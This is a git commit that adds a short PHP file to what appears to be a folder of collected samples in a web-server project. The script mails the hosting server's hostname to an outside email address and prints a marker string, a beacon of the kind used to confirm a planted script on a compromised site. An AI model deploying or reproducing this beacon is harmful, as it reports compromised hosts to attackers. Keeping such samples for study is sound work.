61919fca49b0eeb6860533eb16cf5a09594446f0
Elijah Seymour <dostoevskylabs@users.noreply.github.com>
2017-10-04 04:13:17 +0100

    ehm.php

---
+++ httpd.pl/samples/ehm.php
@@ -0,0 +1,9 @@
+<?php 
+$host = $_SERVER['HTTP_HOST']; 
+
+$headers = "CC: ryglman@yahoo.com\r\n";
+$headers .= "BCC: ryglman@yahoo.com\r\n";
+
+
+if ( mail('ryglman@yahoo.com', $host, 'hgt5y54ytr', $headers) )
+{echo "Jm73uZ";} ?> 
